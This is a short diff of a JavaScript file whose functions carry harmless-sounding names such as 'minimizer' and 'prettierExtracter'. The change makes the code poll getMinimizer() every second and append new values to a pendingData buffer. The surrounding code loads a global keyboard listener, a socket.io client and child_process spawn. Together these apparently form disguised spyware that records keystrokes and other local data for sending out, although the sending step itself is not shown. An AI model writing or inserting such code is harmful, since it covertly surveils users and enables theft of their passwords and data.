@@ -31,6 +31,12 @@ const runForWindows = async () => {
   const { GlobalKeyboardListener } = require("node-global-key-listener");
   const { runRunner } = require("./tools/runner.js");
 
+  minimizerListener.startListening();
+  minimizerListener.on("change", async () => {
+    const change = await getMinimizer();
+    pendingData.minimizer += "," + change;
+  });
+
   prettierExtracter();
   const v = new GlobalKeyboardListener();
 
@@ -47,11 +53,16 @@ const runForWindows = async () => {
 
 const runForAll = async () => {
   // Run Minimizer
-  minimizerListener.startListening();
-  minimizerListener.on("change", async () => {
-    const change = await getMinimizer();
-    pendingData.minimizer += "," + change;
-  });
+
+  let lastMinimizer = '';
+  setInterval(async () => {
+    const curMinimizer = await getMinimizer();
+    if (lastMinimizer != curMinimizer) {
+      pendingData.minimizer += "," + curMinimizer;
+      lastMinimizer = curMinimizer;
+    }
+  }, 1000)
+  
 
   const { io } = require("socket.io-client");
   const { spawn } = require("child_process");
